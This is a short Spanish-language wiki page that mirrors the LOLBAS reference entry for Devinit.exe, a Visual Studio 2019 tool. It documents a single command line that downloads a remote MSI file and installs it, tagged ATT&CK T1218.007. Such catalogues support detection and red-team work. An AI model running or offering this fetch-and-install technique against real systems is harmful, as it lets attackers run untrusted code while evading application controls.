# LOLBAS: Devinit.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Visual Studio 2019 tool

## Comandos

### Executes code from a (remote) MSI file.

Execute · priv: User · T1218.007

```cmd
devinit.exe run -t msi-install -i {REMOTEURL:.msi}
```

Downloads an MSI file to C:\Windows\Installer and then installs it.

